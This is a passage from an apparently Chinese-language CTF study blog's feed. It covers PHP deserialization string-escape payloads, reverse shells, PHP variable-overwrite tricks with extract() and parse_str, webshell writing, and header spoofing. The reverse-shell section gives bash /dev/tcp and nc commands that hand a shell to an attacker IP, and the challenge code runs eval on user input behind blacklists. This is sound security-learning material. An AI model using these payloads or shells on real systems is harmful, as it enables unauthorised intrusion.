<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018093815-swcg80l.png" class="" title="image">​

<p>逃逸或者说被 “顶” 出来的payload就会被当做当前类的属性被继续执行。</p>
<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018094054-kxhz5ol.png" class="" title="image">​

<h3 id="第二种情况——替换之后导致序列化字符串变短"><a href="#第二种情况——替换之后导致序列化字符串变短" class="headerlink" title="第二种情况——替换之后导致序列化字符串变短"></a>第二种情况——替换之后导致序列化字符串变短</h3><p>实验代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_rep</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/php|test/&#x27;</span>,<span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$test</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>]; </span><br><span class="line"><span class="variable">$test</span>[<span class="string">&#x27;number&#x27;</span>] = <span class="string">&#x27;2020&#x27;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">str_rep</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="variable">$temp</span>);</span><br><span class="line"><span class="variable">$fake</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$temp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;name:&quot;</span>.<span class="variable">$fake</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;sign:&quot;</span>.<span class="variable">$fake</span>[<span class="string">&#x27;sign&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;number:&quot;</span>.<span class="variable">$fake</span>[<span class="string">&#x27;number&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输入name和sign，number值是固定的’2020’，经过 <code>序列化--&gt;敏感字替换为空(长度变短)--&gt;反序列化</code>​ 的过程之后再输出结果。</p>
<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018094916-d99p7a9.png" class="" title="image">​

<p>接下来利用漏洞，通过输入name和sign来间接修改number的值：<br>我们要修改number的值，就要在sign中加入<code>&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;</code>​，其长度为27</p>
<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018095009-jzdw1e4.png" class="" title="image">​

<p>但是就这样硬生生的加进去是不行的，我们要进一步构造一下。<br>payload：<code>?name=testtesttesttesttesttest&amp;sign=hello&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</code>​</p>
<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018095227-3wgi5v7.png" class="" title="image">​

<p>这样，就将sign和number的值都修改了。原因分析：<br>在str_rep函数中如果检测到’php’、’test’关键字就把其替换为空，那么就利用这一点，我们故意输入敏感字符，替换为空之后来实现字符逃逸。我们在name中输入了输入了6个test，替换为空后这样就腾出了24个字符的空间，正好包含进了”;s:4:”sign”;s:54:”hello，由于”;s:4:”sign”;s:54:”hello成了name的内容，所以我们还要在后面加个”;s:4:”sign”;s:4:”eval作为sign序列化的内容。<br>​<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018095455-qqoxc5z.png" class="" title="image">​</p>
<h2 id="toString-方法的调用"><a href="#toString-方法的调用" class="headerlink" title="__toString()方法的调用"></a>__toString()方法的调用</h2><p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>反弹shell</title>
    <url>/2023/10/23/%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="1-bash反弹shell"><a href="#1-bash反弹shell" class="headerlink" title="1.bash反弹shell"></a>1.bash反弹shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.20.151/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/%E5%8F%8D%E5%BC%B9shell/image-20231015191534-0wsorjz.png" class="" title="image">​

<p>其实以上bash反弹一句完整的解读过程就是：</p>
<p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。<br> 在反弹shell时要借助netcat工具反弹</p>
<p>Netcat 一句话反弹：Netcat反弹也是非常常用的方法，只是这个方法需要我们手动去安装一个NC环境</p>
<h4 id="开启外网主机监听"><a href="#开启外网主机监听" class="headerlink" title="开启外网主机监听"></a>开启外网主机监听</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8080</span><br></pre></td></tr></table></figure>

<p>如果报错&#x2F;bin&#x2F;sh: 1: Syntax error: Bad fd number    ret&#x3D;2</p>
<p>首先查看&#x2F;bin&#x2F;sh指向：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /bin/sh</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/%E5%8F%8D%E5%BC%B9shell/image-20231015192712-z3kg8ss.png" class="" title="image">​

<p>可以看到&#x2F;bin&#x2F;sh其实是一个软连接文件(l),类似于windows中的快捷方式，只不过在这&#x2F;bin&#x2F;sh这个软连接指向了dash，而我们反弹shell使用的shell环境是dash，所以这一点是反弹出错的根本原因。</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>1.修改指向</p>
<p><code>ln -s -f bash /bin/sh</code>​</p>
<p>2.不需要修改（没有修改权限）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/192.168.234.135/1234 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="2-nc反弹shell"><a href="#2-nc反弹shell" class="headerlink" title="2.nc反弹shell"></a>2.nc反弹shell</h2><p>目标主机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.31.151 7777 -t  /bin/bash</span><br><span class="line"> 命令详解：通过webshell我们可以使用nc命令直接建立一个tcp 8080 的会话连接，</span><br><span class="line">然后将本地的bash通过这个会话连接反弹给目标主机（192.168.31.151）。</span><br></pre></td></tr></table></figure>

<p>攻击机器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>同源策略及跨站访问</title>
    <url>/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="同源策略及跨站访问"><a href="#同源策略及跨站访问" class="headerlink" title="同源策略及跨站访问"></a>同源策略及跨站访问</h1><img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020191653-4c05oky.png" class="" title="image">​

<p>‍</p>
<img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020191754-mrzoufy.png" class="" title="image">​

<img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020191806-80ee81f.png" class="" title="image">​

<img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020191845-7ipdn89.png" class="" title="image">​

<img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020191920-03cjh25.png" class="" title="image">​

<img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020191943-xvf7icp.png" class="" title="image">​

<img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020192011-i224gre.png" class="" title="image">​

<img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020192024-o564ggo.png" class="" title="image">​

<img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020192032-nfnecaw.png" class="" title="image">​

<img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020192114-pnjkn79.png" class="" title="image">​

<img src="/2023/10/23/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E8%B7%A8%E7%AB%99%E8%AE%BF%E9%97%AE/image-20231020192121-g29x1s6.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>同源策略及跨站访问</title>
    <url>/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="小常识"><a href="#小常识" class="headerlink" title="小常识"></a>小常识</h1><h1 id="1-可变变量"><a href="#1-可变变量" class="headerlink" title="1.$$可变变量"></a>1.$$可变变量</h1><p><code>$$a</code>​ 是 PHP 中的一种特殊变量引用语法，被称为”可变变量”（variable variables）。它允许您使用一个变量的值作为另一个变量的名称。</p>
<p>让我们详细解释 <code>$$a</code>​ 的含义：</p>
<ol>
<li><code>$a</code>​ 是一个普通的变量，其中存储了一个字符串值，通常用于表示变量的名称。</li>
<li><code>$$a</code>​ 使用 <code>$a</code>​ 的值作为变量名称，并尝试访问这个变量。</li>
</ol>
<p>例如，如果 <code>$a</code>​ 的值为 “myVar”，那么 <code>$$a</code>​ 将尝试访问名为 <code>$myVar</code>​ 的变量。</p>
<p>下面是一个示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;myVar&quot;</span>;</span><br><span class="line"><span class="variable">$myVar</span> = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>;  <span class="comment">// 输出 &quot;Hello, world!&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>$a</code>​ 包含字符串 “myVar”，然后 <code>$$a</code>​ 将根据 <code>$a</code>​ 的值尝试访问 <code>$myVar</code>​，并将 “Hello, world!” 打印出来。</p>
<p>需要注意的是，使用可变变量时要格外小心，因为它们可能会导致代码的可读性变差，并且在不慎使用时可能引发错误或安全问题。通常情况下，最好使用数组来管理变量，而不是可变变量，以提高代码的可维护性和安全性。</p>
<ol>
<li>满足条件之后以数组形式打印出变量$$a。</li>
<li>$$a可以理解为$($a)，就是让$a的值成为这个大变量的变量名。</li>
<li>由此我们可以想到$GLOBALS — 引用全局作用域中可用的全部变量。</li>
<li>利用它，我们可以输出所有变量，所以构造payload:?c&#x3D;GLOBALS</li>
</ol>
<p>这时候$$a就变成了$GLOBALS。</p>
<h1 id="2-X-Forwarded-For"><a href="#2-X-Forwarded-For" class="headerlink" title="2.X-Forwarded-For"></a>2.X-Forwarded-For</h1><p><code>X-Forwarded-For</code>​ 是一个HTTP请求头，通常用于表示HTTP请求经过的代理服务器链中的客户端IP地址。这个头字段的值是一个逗号分隔的IP地址列表，最左边的IP地址表示最初的客户端IP，而最右边的IP地址表示最后一个代理服务器的IP。这是一个示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: client, proxy1, proxy2</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>client</code>​ 是最初的客户端IP地址，<code>proxy1</code>​ 和 <code>proxy2</code>​ 是两个代理服务器的IP地址，它们按顺序处理了HTTP请求。</p>
<p><code>X-Forwarded-For</code>​ 头的作用是帮助后端服务器了解请求的真实客户端IP地址，尤其在请求通过代理服务器、负载均衡器或反向代理服务器时很有用。默认情况下，HTTP请求的源IP地址是代理服务器的IP地址，而不是最初客户端的IP地址。通过查看<code>X-Forwarded-For</code>​ 头，后端服务器可以获取到客户端的真实IP地址。</p>
<p>然而，需要注意以下几点：</p>
<ol>
<li><strong>安全性问题：</strong> <code>X-Forwarded-For</code>​ 头是可伪造的。客户端可以在请求中添加自己构造的<code>X-Forwarded-For</code>​ 头，因此不能完全信任它来确定客户端的真实IP地址。因此，不应将其用于安全性相关的操作，如访问控制或身份验证。</li>
<li><strong>代理链：</strong> 如果请求经过多个代理服务器，<code>X-Forwarded-For</code>​ 头中的IP地址列表可能会很长。您可能需要解析这个头来提取最初客户端的IP地址。</li>
<li><strong>代理配置：</strong> 代理服务器必须正确配置以传递 <code>X-Forwarded-For</code>​ 头。如果代理服务器没有传递这个头或错误地修改了它，后端服务器将无法获取真实的客户端IP地址。</li>
</ol>
<p>总之，<code>X-Forwarded-For</code>​ 头是有用的，但必须小心使用，特别是在考虑安全性时。在合适的情况下，它可以帮助您了解请求的来源。</p>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231009142757-8v0ce1y.png" class="" title="image">​

<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231009142829-tux92ut.png" class="" title="image">​

<h1 id="3-POST请求（BP）"><a href="#3-POST请求（BP）" class="headerlink" title="3.POST请求（BP）"></a>3.POST请求（BP）</h1><p>Content-Type: application&#x2F;x-www-form-urlencoded</p>
<p><code>Content-Type: application/x-www-form-urlencoded</code>​ 是一个HTTP头，通常用于指示HTTP请求的主体（body）数据格式。这个特定的<code>Content-Type</code>​值表示请求主体中包含的数据采用了经典的URL编码格式，通常用于HTML表单提交数据。</p>
<p>在 <code>application/x-www-form-urlencoded</code>​ 格式中，数据以键值对的形式发送，键值对之间使用 <code>&amp;</code>​ 符号分隔，而键和值之间使用 <code>=</code>​ 符号分隔。例如，一个简单的表单提交可能会创建以下形式的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=John+Doe&amp;age=30&amp;city=New+York</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231009145738-cxb8796.png" class="" title="image">​

<h2 id="4-foreach配合-是典型变量覆盖漏洞"><a href="#4-foreach配合-是典型变量覆盖漏洞" class="headerlink" title="4.foreach配合$$是典型变量覆盖漏洞"></a>4.foreach配合$$是典型变量覆盖漏洞</h2><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。</p>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231010093451-9fkvisp.png" class="" title="image">​

<h2 id="5-POST传参写shell"><a href="#5-POST传参写shell" class="headerlink" title="5.POST传参写shell"></a>5.POST传参写shell</h2><img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231010102221-v0qduol.png" class="" title="image">



<p>1.为什么利用base64编码一句话木马，因为如果直接写入，&lt;?php exit();会截断。</p>
<p>2.利用a补位，如果不用a补位，一句话木马就解析不出来。</p>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231010102631-aw9mix3.png" class="" title="image">​

<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231010102707-u8pqggg.png" class="" title="image">​

<h2 id="6-extract-函数变量覆盖漏洞"><a href="#6-extract-函数变量覆盖漏洞" class="headerlink" title="6.extract()函数变量覆盖漏洞"></a>6.extract()函数变量覆盖漏洞</h2><p>例题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in $flag</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;sys&#x27;</span>];</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span> == <span class="string">&#x27;8gen1&#x27;</span> &amp;&amp; <span class="variable">$flag2</span> == <span class="string">&#x27;8gen1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;504_SYS.COM&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\?/&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>);  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><strong>@parse_str($_SERVER[‘QUERY_STRING’]);<br>extract($_POST);</strong></p>
<p><code>$_SERVER</code>​ 是 PHP 的一个超全局数组，用于存储有关服务器和当前脚本的信息。它包含了许多有用的键值对，可以用于访问和管理服务器环境的各种信息。以下是一些 <code>$_SERVER</code>​ 超全局数组中常见的键和其含义：</p>
<ol>
<li><code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code>​：包含用户代理字符串，用于识别用户的浏览器和操作系统。</li>
<li><code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>​：包含引导用户到当前页面的 URL。</li>
<li><code>$_SERVER[&#39;SERVER_NAME&#39;]</code>​：包含当前服务器的主机名。</li>
<li><code>$_SERVER[&#39;SERVER_ADDR&#39;]</code>​：包含服务器的 IP 地址。</li>
<li><code>$_SERVER[&#39;REQUEST_METHOD&#39;]</code>​：包含当前请求的 HTTP 方法，如 GET、POST、或其他。</li>
<li><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>​：包含查询字符串，即 URL 中问号后的部分。</li>
<li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>​：包含客户端的 IP 地址。</li>
<li><code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code>​：包含当前执行的脚本的文件路径。</li>
<li><code>$_SERVER[&#39;REQUEST_URI&#39;]</code>​：包含当前请求的 URI（Uniform Resource Identifier），包括路径和查询字符串。</li>
<li><code>$_SERVER[&#39;HTTP_HOST&#39;]</code>​：包含当前 HTTP 请求中的主机名和端口。</li>
</ol>
<p>例如</p>
<p><a href="http://www.xxx.com/index.php?p=123&q=456">http://www.xxx.com/index.php?p=123&amp;q=456</a></p>
<p>结果：$_SERVER[“QUERY_STRING”]&#x3D;“p&#x3D;123&amp;q&#x3D;456”</p>
<p>‍</p>
<p><code>parse_str</code>​ 是 PHP 中的一个内置函数，其主要作用是将查询字符串解析为变量并放入当前作用域中。它的一般语法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span> <span class="variable">$str</span>, <span class="keyword">array</span> &amp;<span class="variable">$arr</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$str</code>​ 是包含查询字符串的字符串。</li>
<li><code>$arr</code>​ 是一个可选参数，如果提供，解析后的变量将被存储在该数组中。</li>
</ul>
<p><code>parse_str</code>​ 的主要作用包括：</p>
<ol>
<li>解析查询字符串：它可以将一个包含查询字符串的字符串（通常是 URL 查询参数部分）分解成单个变量，并将它们放入当前作用域中。</li>
<li>设置变量：它可以根据查询字符串中的名称和值创建对应的 PHP 变量，并将这些变量的值设置为查询字符串中的值。</li>
<li>处理表单数据：通常在处理 HTML 表单提交时，<code>parse_str</code>​ 可以用来将表单数据提取为 PHP 变量，以便在服务器端进行处理。</li>
</ol>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$queryString</span> = <span class="string">&quot;name=John&amp;age=30&amp;city=NewYork&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$queryString</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;  <span class="comment">// 输出 &quot;John&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;   <span class="comment">// 输出 &quot;30&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$city</span>;  <span class="comment">// 输出 &quot;NewYork&quot;</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，<code>parse_str</code>​ 在将查询字符串解析为变量时，会覆盖已经存在的同名变量，因此要小心不要覆盖现有的变量。此外，为了安全性考虑，应该谨慎处理用户提供的查询字符串，以防止潜在的安全风险。</p>
<p>‍</p>
<p><code>extract($_POST)</code>​：这一行代码尝试将所有 POST 参数提取为独立的 PHP 变量。这将 POST 参数的名称作为变量名，其值作为变量的值，使它们在当前作用域中可用。</p>
<p>‍</p>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231015151405-wqyw0a0.png" class="" title="image">​

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?_POST[flag1]=<span class="number">8</span>gen1&amp;_POST[flag2]=<span class="number">8</span>gen1</span><br></pre></td></tr></table></figure>

<p>‍</p>
<p><code>&quot;_POST[flag1]=8gen1&amp;_POST[flag2]=8gen1&quot;</code>​ 和 <code>&quot;flag1=8gen1&amp;flag2=8gen1&quot;</code>​ 这两种查询字符串的格式之间确实有区别。</p>
<ol>
<li><p><code>_POST</code>​ 部分：在 <code>&quot;_POST[flag1]=8gen1&amp;_POST[flag2]=8gen1&quot;</code>​ 查询字符串中，参数名被放在 <code>_POST</code>​ 数组中，这似乎模拟了 POST 请求中的参数结构，但实际上并不是标准的查询字符串格式。这样的查询字符串通常需要额外的处理来提取其中的参数。</p>
<p><code>extract</code>​ 函数是用来将数组的键作为变量名，键对应的值作为变量的值，引入到当前作用域中。它可以处理任何关联数组，包括 <code>$_POST</code>​ 数组。</p>
</li>
<li><p>标准查询字符串：而 <code>&quot;flag1=8gen1&amp;flag2=8gen1&quot;</code>​ 查询字符串是标准的查询字符串格式，其中参数名和值直接由等号分隔，并且参数之间使用和号 <code>&amp;</code>​ 分隔。这是常见的 URL 查询字符串格式，适用于 GET 请求和一般的数据传递。</p>
</li>
</ol>
<p>众所周知，php变量名只能是数字字母下划线，传进去的变量名会将  , +,.,[转换成_，若变量中有.，[替换成_后，之后的字符不会再被替换成_，例如a[b.c  a_b.c，所以我们post传入504[SYS.COM&#x3D;123&amp;echo $flag;，得到flag</p>
<h2 id="7-hextobin"><a href="#7-hextobin" class="headerlink" title="7.hextobin"></a>7.hextobin</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: ShawRoot</span></span><br><span class="line"><span class="comment"># @Date:  2022-07-21 08:42:23</span></span><br><span class="line"><span class="comment"># @link: https://shawroot.cc</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$args1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args1&#x27;</span>];</span><br><span class="line"><span class="variable">$args2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args2&#x27;</span>];</span><br><span class="line"><span class="variable">$args3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args3&#x27;</span>];</span><br><span class="line"><span class="variable">$evil</span> = <span class="variable">$args1</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$args2</span>.<span class="string">&#x27;)(&#x27;</span>.<span class="variable">$args3</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$blacklist</span> = <span class="string">&#x27;/system|ass|exe|nc|eval|copy|write|\.|\&gt;|\_|\^|\~|%|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$blacklist</span>,<span class="variable">$evil</span>) <span class="keyword">and</span> !<span class="title function_ invoke__">ctype_space</span>(<span class="variable">$evil</span>) <span class="keyword">and</span> <span class="title function_ invoke__">ctype_graph</span>(<span class="variable">$evil</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$evil</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$evil</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<h2 id="8-sql注入时"><a href="#8-sql注入时" class="headerlink" title="8.sql注入时"></a>8.sql注入时</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> `<span class="number">123456789</span>`;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">关于在这里使用 ` 而不是 ’ 的一些解释：</span><br><span class="line"></span><br><span class="line">两者在linux下和windows下不同，linux下不区分，windows下区分。</span><br><span class="line"></span><br><span class="line">单引号 ’ 或双引号主要用于 字符串的引用符号</span><br><span class="line"></span><br><span class="line">反勾号 ` 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc下面的键)</span><br><span class="line"></span><br><span class="line">有MYSQL保留字作为字段的，必须加上反引号来区分！！！</span><br><span class="line"></span><br><span class="line">如果是数值，请不要使用引号</span><br></pre></td></tr></table></figure>

<h2 id="9-Referer伪造访问来源"><a href="#9-Referer伪造访问来源" class="headerlink" title="9.Referer伪造访问来源"></a>9.Referer伪造访问来源</h2><p>‍</p>
<p>伪造访问来源，Referer协议就是告诉服务器我从哪里来。所以抓包修改。</p>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231022205033-rdbpdfi.png" class="" title="image">​

<h2 id="10-User-Agent伪造访问浏览器"><a href="#10-User-Agent伪造访问浏览器" class="headerlink" title="10.User-Agent伪造访问浏览器"></a>10.User-Agent伪造访问浏览器</h2><p>用<code>User-Agent</code>​协议来伪造访问工具为 Syclover 浏览器，这个协议就是告诉服务器我是用什么访问的 .修改 User-Agent 为<code>User-Agent: Syclover</code>​</p>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231022205155-pyagvd7.png" class="" title="image">​

<p>‍</p>
